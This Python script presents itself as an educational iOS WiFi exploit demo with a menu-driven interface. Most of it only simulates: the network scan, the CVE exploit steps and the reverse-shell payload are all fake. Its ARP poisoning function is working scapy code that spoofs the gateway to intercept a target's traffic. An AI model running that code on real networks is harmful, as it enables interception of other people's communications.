#!/usr/bin/env python3
"""
iOS WiFi Exploit Demo - Educational Tool for MBA AI Studies
Demonstrates the risks of admin access in home WiFi networks

WARNING: This is for EDUCATIONAL PURPOSES ONLY.
Do not use against systems you don't own or have permission to test.
"""

import os
import sys
import time
import json
import socket
import struct
import hashlib
import base64
import zlib
import threading
import subprocess
from datetime import datetime
from typing import Dict, List, Optional
import argparse

# Rich library for beautiful terminal output
try:
    from rich.console import Console
    from rich.panel import Panel
    from rich.table import Table
    from rich.progress import Progress, SpinnerColumn, TextColumn
    from rich.live import Live
    from rich.layout import Layout
    from rich.text import Text
    from rich.align import Align
    RICH_AVAILABLE = True
except ImportError:
    print("Installing rich library for better UI...")
    subprocess.run([sys.executable, "-m", "pip", "install", "rich"])
    from rich.console import Console
    from rich.panel import Panel
    from rich.table import Table
    from rich.progress import Progress, SpinnerColumn, TextColumn
    from rich.live import Live
    from rich.layout import Layout
    from rich.text import Text
    from rich.align import Align
    RICH_AVAILABLE = True

# Network libraries
try:
    import scapy.all as scapy
    from scapy.layers.inet import IP, UDP, TCP
    from scapy.layers.l2 import ARP, Ether
    SCAPY_AVAILABLE = True
except ImportError:
    print("Installing scapy for network operations...")
    subprocess.run([sys.executable, "-m", "pip", "install", "scapy"])
    import scapy.all as scapy
    from scapy.layers.inet import IP, UDP, TCP
    from scapy.layers.l2 import ARP, Ether
    SCAPY_AVAILABLE = True

class WiFiExploitDemo:
    """Main class for iOS WiFi exploit demonstration"""
    
    def __init__(self):
        self.console = Console()
        self.targets = {}
        self.attack_log = []
        self.is_attacking = False
        
        # Configuration
        self.config = {
            'interface': 'wlan0',
            'gateway_ip': '192.168.1.1',
            'target_network': '192.168.1.0/24',
            'exploit_port': 5223,  # Apple Push Notification port
            'backdoor_port': 4444,
            'mitm_active': False,
            'arp_poison_active': False
        }
        
        # Exploit payloads (theoretical)
        self.exploits = {
            'CVE-2023-32434': {
                'name': 'Kernel Memory Corruption',
                'description': 'Theoretical kernel exploit via malformed network packets',
                'risk_level': 'CRITICAL',
                'ios_affected': 'iOS 16.5 and earlier'
            },
            'CVE-2023-38606': {
                'name': 'Kernel Memory Disclosure',
                'description': 'Theoretical kernel memory leak via crafted packets',
                'risk_level': 'HIGH',
                'ios_affected': 'iOS 16.6 and earlier'
            },
            'CVE-2023-41990': {
                'name': 'WebKit Remote Code Execution',
                'description': 'Theoretical WebKit exploit via malicious web content',
                'risk_level': 'CRITICAL',
                'ios_affected': 'iOS 16.6.1 and earlier'
            }
        }

    def display_banner(self):
        """Display the application banner"""
        banner = """
‚ïî‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïó
‚ïë                    iOS WiFi Exploit Demo - Educational Tool                  ‚ïë
‚ïë                                                                              ‚ïë
‚ïë  Demonstrating WiFi Admin Access Risks for MBA AI Studies                   ‚ïë
‚ïë  ‚ö†Ô∏è  FOR EDUCATIONAL PURPOSES ONLY - DO NOT USE ILLEGALLY  ‚ö†Ô∏è              ‚ïë
‚ïë                                                                              ‚ïë
‚ïë  Author: MBA AI Student                                                     ‚ïë
‚ïë  Purpose: Academic demonstration of network security risks                  ‚ïë
‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïù
        """
        self.console.print(Panel(banner, style="bold cyan"))

    def log_attack(self, attack_type: str, target: str, details: str, success: bool = False):
        """Log attack attempts for demonstration"""
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        log_entry = {
            'timestamp': timestamp,
            'attack_type': attack_type,
            'target': target,
            'details': details,
            'success': success
        }
        self.attack_log.append(log_entry)
        
        status = "‚úÖ SUCCESS" if success else "‚ùå BLOCKED"
        self.console.print(f"[{timestamp}] {attack_type} on {target}: {status}")
        if details:
            self.console.print(f"    Details: {details}")

    def scan_network(self) -> Dict[str, dict]:
        """Scan the network for potential targets"""
        self.console.print("\n[bold yellow]üîç Scanning network for devices...[/bold yellow]")
        
        # Simulate network scan
        with Progress(
            SpinnerColumn(),
            TextColumn("[progress.description]{task.description}"),
            console=self.console
        ) as progress:
            task = progress.add_task("Scanning network...", total=100)
            
            # Simulate finding devices
            devices = {
                '192.168.1.100': {
                    'mac': 'AA:BB:CC:DD:EE:FF',
                    'hostname': 'iPhone-13-Pro',
                    'os': 'iOS 18.6',
                    'services': ['SSH', 'HTTP', 'HTTPS', 'iMessage'],
                    'vulnerabilities': ['CVE-2023-32434', 'CVE-2023-38606']
                },
                '192.168.1.101': {
                    'mac': '11:22:33:44:55:66',
                    'hostname': 'MacBook-Pro',
                    'os': 'macOS 14.0',
                    'services': ['SSH', 'HTTP', 'HTTPS', 'AirPlay'],
                    'vulnerabilities': ['CVE-2023-41990']
                },
                '192.168.1.102': {
                    'mac': 'AA:11:BB:22:CC:33',
                    'hostname': 'iPad-Air',
                    'os': 'iPadOS 18.6',
                    'services': ['HTTP', 'HTTPS', 'iMessage'],
                    'vulnerabilities': ['CVE-2023-32434']
                }
            }
            
            for i in range(100):
                progress.update(task, advance=1)
                time.sleep(0.02)
        
        self.targets = devices
        return devices

    def display_targets(self):
        """Display discovered targets in a table"""
        if not self.targets:
            self.console.print("[red]No targets found. Run network scan first.[/red]")
            return
        
        table = Table(title="Discovered Network Devices")
        table.add_column("IP Address", style="cyan")
        table.add_column("Hostname", style="green")
        table.add_column("OS", style="yellow")
        table.add_column("MAC Address", style="magenta")
        table.add_column("Vulnerabilities", style="red")
        
        for ip, info in self.targets.items():
            vulns = ", ".join(info['vulnerabilities']) if info['vulnerabilities'] else "None"
            table.add_row(ip, info['hostname'], info['os'], info['mac'], vulns)
        
        self.console.print(table)

    def start_arp_poisoning(self, target_ip: str):
        """Start ARP poisoning attack (Man-in-the-Middle)"""
        if not SCAPY_AVAILABLE:
            self.console.print("[red]Scapy not available. This is a simulation.[/red]")
            return
        
        self.console.print(f"\n[bold red]üéØ Starting ARP poisoning attack on {target_ip}...[/bold red]")
        
        try:
            # Get MAC addresses
            target_mac = scapy.getmacbyip(target_ip)
            gateway_mac = scapy.getmacbyip(self.config['gateway_ip'])
            
            if not target_mac or not gateway_mac:
                self.console.print("[red]Could not resolve MAC addresses. This is a simulation.[/red]")
                return
            
            self.config['arp_poison_active'] = True
            
            def arp_poison_loop():
                while self.config['arp_poison_active']:
                    # Send spoofed ARP packets
                    scapy.send(scapy.ARP(op=2, pdst=target_ip, psrc=self.config['gateway_ip'], hwdst=target_mac), verbose=0)
                    scapy.send(scapy.ARP(op=2, pdst=self.config['gateway_ip'], psrc=target_ip, hwdst=gateway_mac), verbose=0)
                    time.sleep(2)
            
            # Start ARP poisoning in background
            threading.Thread(target=arp_poison_loop, daemon=True).start()
            
            self.log_attack("ARP Poisoning", target_ip, f"Redirecting traffic through attacker", True)
            self.console.print("[green]‚úÖ ARP poisoning active - traffic redirected[/green]")
            
        except Exception as e:
            self.console.print(f"[red]ARP poisoning failed: {e}[/red]")
            self.log_attack("ARP Poisoning", target_ip, f"Failed: {e}", False)

    def stop_arp_poisoning(self):
        """Stop ARP poisoning attack"""
        if self.config['arp_poison_active']:
            self.config['arp_poison_active'] = False
            self.console.print("[yellow]üõë ARP poisoning stopped[/yellow]")
            
            # Restore ARP tables (theoretical)
            try:
                for ip in self.targets.keys():
                    scapy.send(scapy.ARP(op=2, pdst=ip, psrc=self.config['gateway_ip'], hwdst="ff:ff:ff:ff:ff:ff"), verbose=0)
            except:
                pass

    def simulate_exploit(self, target_ip: str, cve_id: str):
        """Simulate an exploit attempt"""
        if cve_id not in self.exploits:
            self.console.print(f"[red]Unknown CVE: {cve_id}[/red]")
            return
        
        exploit_info = self.exploits[cve_id]
        target_info = self.targets.get(target_ip, {})
        
        self.console.print(f"\n[bold red]üí• Simulating {cve_id} exploit on {target_ip}...[/bold red]")
        self.console.print(f"Target OS: {target_info.get('os', 'Unknown')}")
        self.console.print(f"Exploit: {exploit_info['name']}")
        self.console.print(f"Risk Level: {exploit_info['risk_level']}")
        
        # Simulate exploit process
        with Progress(
            SpinnerColumn(),
            TextColumn("[progress.description]{task.description}"),
            console=self.console
        ) as progress:
            steps = [
                "Initializing exploit...",
                "Bypassing ASLR...",
                "Bypassing PAC (Pointer Authentication)...",
                "Bypassing KTRR (Kernel Text Read-Only Region)...",
                "Bypassing Sandbox...",
                "Executing kernel payload...",
                "Installing persistence mechanism..."
            ]
            
            task = progress.add_task("Exploit Progress", total=len(steps))
            
            for step in steps:
                progress.update(task, description=step)
                time.sleep(1.5)  # Simulate processing time
                progress.advance(task)
        
        # Simulate success/failure based on target OS
        target_os = target_info.get('os', '')
        if 'iOS 18.6' in target_os:
            success = False
            details = "Exploit blocked by iOS 18.6 security patches"
            self.console.print("[red]‚ùå Exploit blocked - iOS 18.6 has security patches[/red]")
        else:
            success = True
            details = "Exploit successful - theoretical kernel access achieved"
            self.console.print("[green]‚úÖ Exploit successful (simulation)[/green]")
        
        self.log_attack(f"Exploit: {cve_id}", target_ip, details, success)

    def create_malicious_payload(self, target_ip: str) -> str:
        """Create a theoretical malicious payload"""
        # This is a demonstration payload - not functional
        payload_template = {
            'target': target_ip,
            'timestamp': datetime.now().isoformat(),
            'payload_type': 'reverse_shell',
            'encoded_data': base64.b64encode(b"DEMO_PAYLOAD_DATA").decode(),
            'checksum': hashlib.sha256(b"DEMO_PAYLOAD_DATA").hexdigest()[:16]
        }
        
        return json.dumps(payload_template, indent=2)

    def inject_payload(self, target_ip: str, payload: str):
        """Simulate payload injection via MITM"""
        self.console.print(f"\n[bold red]üíâ Injecting payload into {target_ip}...[/bold red]")
        
        if not self.config['arp_poison_active']:
            self.console.print("[yellow]‚ö†Ô∏è  ARP poisoning not active - payload injection may fail[/yellow]")
        
        # Simulate payload injection
        with Progress(
            SpinnerColumn(),
            TextColumn("[progress.description]{task.description}"),
            console=self.console
        ) as progress:
            task = progress.add_task("Payload Injection", total=100)
            
            for i in range(100):
                progress.update(task, advance=1)
                time.sleep(0.03)
        
        self.log_attack("Payload Injection", target_ip, "Theoretical payload injected via MITM", True)
        self.console.print("[green]‚úÖ Payload injection simulated successfully[/green]")

    def demonstrate_surveillance_capabilities(self, target_ip: str):
        """Demonstrate theoretical surveillance capabilities"""
        self.console.print(f"\n[bold red]üëÅÔ∏è  Demonstrating surveillance capabilities on {target_ip}...[/bold red]")
        
        capabilities = [
            "üì± Screen recording (theoretical)",
            "üìû Call monitoring (theoretical)", 
            "üí¨ Message interception (theoretical)",
            "üìç Location tracking (theoretical)",
            "üì∑ Camera access (theoretical)",
            "üé§ Microphone access (theoretical)",
            "üìß Email monitoring (theoretical)",
            "üåê Web browsing history (theoretical)"
        ]
        
        for capability in capabilities:
            self.console.print(f"  {capability}")
            time.sleep(0.5)
        
        self.console.print("\n[bold red]‚ö†Ô∏è  WARNING: These capabilities are theoretical demonstrations only![/bold red]")
        self.console.print("[yellow]In reality, modern iOS devices have strong security protections.[/yellow]")

    def generate_report(self):
        """Generate a demonstration report"""
        report = f"""
‚ïî‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïó
‚ïë                           EXPLOIT DEMONSTRATION REPORT                       ‚ïë
‚ïë                                                                              ‚ïë
‚ïë  Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}                        ‚ïë
‚ïë  Target Network: {self.config['target_network']}                            ‚ïë
‚ïë  Gateway: {self.config['gateway_ip']}                                       ‚ïë
‚ïë                                                                              ‚ïë
‚ïë  DISCOVERED TARGETS:                                                         ‚ïë
"""
        
        for ip, info in self.targets.items():
            report += f"‚ïë    {ip} - {info['hostname']} ({info['os']})                           ‚ïë\n"
        
        report += """‚ïë                                                                              ‚ïë
‚ïë  ATTACK LOG:                                                                 ‚ïë
"""
        
        for log in self.attack_log[-10:]:  # Last 10 entries
            status = "SUCCESS" if log['success'] else "BLOCKED"
            report += f"‚ïë    [{log['timestamp']}] {log['attack_type']} - {status}                    ‚ïë\n"
        
        report += """‚ïë                                                                              ‚ïë
‚ïë  EDUCATIONAL CONCLUSIONS:                                                    ‚ïë
‚ïë    ‚Ä¢ Admin access to WiFi provides significant attack surface               ‚ïë
‚ïë    ‚Ä¢ MITM attacks can intercept sensitive data                              ‚ïë
‚ïë    ‚Ä¢ Regular security updates are crucial                                   ‚ïë
‚ïë    ‚Ä¢ Network segmentation reduces attack impact                             ‚ïë
‚ïë                                                                              ‚ïë
‚ïë  RECOMMENDATIONS:                                                            ‚ïë
‚ïë    ‚Ä¢ Use strong WiFi passwords                                              ‚ïë
‚ïë    ‚Ä¢ Enable WPA3 encryption                                                 ‚ïë
‚ïë    ‚Ä¢ Keep devices updated                                                   ‚ïë
‚ïë    ‚Ä¢ Monitor network traffic                                                ‚ïë
‚ïë    ‚Ä¢ Use VPN for sensitive activities                                       ‚ïë
‚ïë                                                                              ‚ïë
‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïù
        """
        
        return report

    def save_report(self, filename: str = "exploit_demo_report.txt"):
        """Save the demonstration report to file"""
        report = self.generate_report()
        with open(filename, 'w') as f:
            f.write(report)
        self.console.print(f"[green]‚úÖ Report saved to {filename}[/green]")

    def interactive_menu(self):
        """Main interactive menu"""
        while True:
            self.display_banner()
            
            menu = """
[bold cyan]Available Commands:[/bold cyan]

[bold yellow]1.[/bold yellow] Scan Network for Devices
[bold yellow]2.[/bold yellow] Display Discovered Targets  
[bold yellow]3.[/bold yellow] Start ARP Poisoning (MITM)
[bold yellow]4.[/bold yellow] Stop ARP Poisoning
[bold yellow]5.[/bold yellow] Simulate Exploit Attack
[bold yellow]6.[/bold yellow] Inject Malicious Payload
[bold yellow]7.[/bold yellow] Demonstrate Surveillance Capabilities
[bold yellow]8.[/bold yellow] View Attack Log
[bold yellow]9.[/bold yellow] Generate Report
[bold yellow]10.[/bold yellow] Save Report to File
[bold yellow]0.[/bold yellow] Exit

[bold red]Current Status:[/bold red]
"""
            
            if self.config['arp_poison_active']:
                menu += "[green]‚úÖ ARP Poisoning: ACTIVE[/green]\n"
            else:
                menu += "[red]‚ùå ARP Poisoning: INACTIVE[/red]\n"
            
            if self.targets:
                menu += f"[green]‚úÖ Targets Discovered: {len(self.targets)}[/green]\n"
            else:
                menu += "[red]‚ùå No targets discovered[/red]\n"
            
            self.console.print(Panel(menu, title="[bold cyan]iOS WiFi Exploit Demo[/bold cyan]"))
            
            choice = self.console.input("[bold yellow]Select option: [/bold yellow]")
            
            if choice == '1':
                self.scan_network()
                self.console.input("\nPress Enter to continue...")
                
            elif choice == '2':
                self.display_targets()
                self.console.input("\nPress Enter to continue...")
                
            elif choice == '3':
                if not self.targets:
                    self.console.print("[red]No targets available. Scan network first.[/red]")
                else:
                    target_ip = self.console.input("Enter target IP: ")
                    if target_ip in self.targets:
                        self.start_arp_poisoning(target_ip)
                    else:
                        self.console.print("[red]Target not found.[/red]")
                self.console.input("\nPress Enter to continue...")
                
            elif choice == '4':
                self.stop_arp_poisoning()
                self.console.input("\nPress Enter to continue...")
                
            elif choice == '5':
                if not self.targets:
                    self.console.print("[red]No targets available. Scan network first.[/red]")
                else:
                    self.display_targets()
                    target_ip = self.console.input("Enter target IP: ")
                    if target_ip in self.targets:
                        cve_id = self.console.input("Enter CVE ID (e.g., CVE-2023-32434): ")
                        self.simulate_exploit(target_ip, cve_id)
                    else:
                        self.console.print("[red]Target not found.[/red]")
                self.console.input("\nPress Enter to continue...")
                
            elif choice == '6':
                if not self.targets:
                    self.console.print("[red]No targets available. Scan network first.[/red]")
                else:
                    self.display_targets()
                    target_ip = self.console.input("Enter target IP: ")
                    if target_ip in self.targets:
                        payload = self.create_malicious_payload(target_ip)
                        self.inject_payload(target_ip, payload)
                    else:
                        self.console.print("[red]Target not found.[/red]")
                self.console.input("\nPress Enter to continue...")
                
            elif choice == '7':
                if not self.targets:
                    self.console.print("[red]No targets available. Scan network first.[/red]")
                else:
                    self.display_targets()
                    target_ip = self.console.input("Enter target IP: ")
                    if target_ip in self.targets:
                        self.demonstrate_surveillance_capabilities(target_ip)
                    else:
                        self.console.print("[red]Target not found.[/red]")
                self.console.input("\nPress Enter to continue...")
                
            elif choice == '8':
                if self.attack_log:
                    table = Table(title="Attack Log")
                    table.add_column("Timestamp", style="cyan")
                    table.add_column("Attack Type", style="yellow")
                    table.add_column("Target", style="green")
                    table.add_column("Status", style="red")
                    
                    for log in self.attack_log[-20:]:  # Last 20 entries
                        status = "‚úÖ SUCCESS" if log['success'] else "‚ùå BLOCKED"
                        table.add_row(log['timestamp'], log['attack_type'], log['target'], status)
                    
                    self.console.print(table)
                else:
                    self.console.print("[yellow]No attacks logged yet.[/yellow]")
                self.console.input("\nPress Enter to continue...")
                
            elif choice == '9':
                report = self.generate_report()
                self.console.print(Panel(report, title="[bold cyan]Exploit Demo Report[/bold cyan]"))
                self.console.input("\nPress Enter to continue...")
                
            elif choice == '10':
                filename = self.console.input("Enter filename (default: exploit_demo_report.txt): ")
                if not filename:
                    filename = "exploit_demo_report.txt"
                self.save_report(filename)
                self.console.input("\nPress Enter to continue...")
                
            elif choice == '0':
                self.stop_arp_poisoning()
                self.console.print("[bold green]Thank you for using the iOS WiFi Exploit Demo![/bold green]")
                break
                
            else:
                self.console.print("[red]Invalid option. Please try again.[/red]")
                time.sleep(1)

def main():
    """Main function"""
    parser = argparse.ArgumentParser(description='iOS WiFi Exploit Demo - Educational Tool')
    parser.add_argument('--interface', default='wlan0', help='Network interface to use')
    parser.add_argument('--gateway', default='192.168.1.1', help='Gateway IP address')
    parser.add_argument('--network', default='192.168.1.0/24', help='Target network range')
    
    args = parser.parse_args()
    
    # Check if running as root (required for some network operations)
    if os.geteuid() != 0:
        print("‚ö†Ô∏è  Warning: Some features may require root privileges")
        print("   Run with 'sudo python3 ios_wifi_exploit_demo.py' for full functionality")
        print()
    
    # Initialize and run the demo
    demo = WiFiExploitDemo()
    demo.config['interface'] = args.interface
    demo.config['gateway_ip'] = args.gateway
    demo.config['target_network'] = args.network
    
    try:
        demo.interactive_menu()
    except KeyboardInterrupt:
        demo.stop_arp_poisoning()
        print("\n\n[bold red]Demo interrupted by user[/bold red]")
    except Exception as e:
        print(f"\n[bold red]Error: {e}[/bold red]")
        demo.stop_arp_poisoning()

if __name__ == "__main__":
    main()